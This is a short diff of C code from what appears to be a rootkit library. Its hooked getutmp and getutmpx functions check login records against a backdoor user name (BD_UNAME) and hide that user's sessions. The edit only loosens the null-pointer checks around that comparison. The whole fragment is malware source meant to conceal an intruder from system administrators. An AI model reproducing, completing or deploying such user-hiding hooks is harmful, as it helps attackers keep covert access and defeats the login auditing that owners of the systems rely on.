@@ -90,7 +90,7 @@ struct utmpx *getutxent(void){
 void getutmp(const struct utmpx *ux, struct utmp *u){
     if(hide_me) return;
 
-    if(ux && ux->ut_user != NULL){
+    if(ux){
         if(!strncmp(BD_UNAME, ux->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
             return;
@@ -104,7 +104,7 @@ void getutmp(const struct utmpx *ux, struct utmp *u){
 void getutmpx(const struct utmp *u, struct utmpx *ux){
     if(hide_me) return;
 
-    if(u && u->ut_user != NULL){
+    if(u){
         if(!strncmp(BD_UNAME, u->ut_user, strlen(BD_UNAME))){
             hide_me = 1;
             return;
